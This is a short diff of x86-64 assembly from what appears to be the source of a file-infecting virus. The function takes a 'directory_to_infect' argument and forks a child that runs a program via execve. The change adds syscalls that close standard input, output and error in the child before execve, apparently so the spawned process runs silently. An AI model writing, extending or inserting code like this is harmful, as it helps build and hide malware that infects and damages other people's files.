@@ -20,6 +20,15 @@ _thread_create: ;void thread_create(not used, char *directory_to_infect, char *b
 	cmp rax, 0 ; check the return of fork: 0 is child, other is parent
 	jne _parent_ret
 ; Here we are in the child process
+	mov rax, 3
+	mov rdi, 1
+	syscall
+	mov rax, 3
+	mov rdi, 2
+	syscall
+	mov rax, 3
+	mov rdi, 0
+	syscall
 	mov rax, SYS_EXECVE ; execve(char *filename, char *argv[], char *envp)
 	mov rdi, QWORD [rsp] ; the file name is the last address we pushed on stack
 	mov rsi, rsp ; we have our 3 address on stack, so we just mov our stack pointer for the arguments
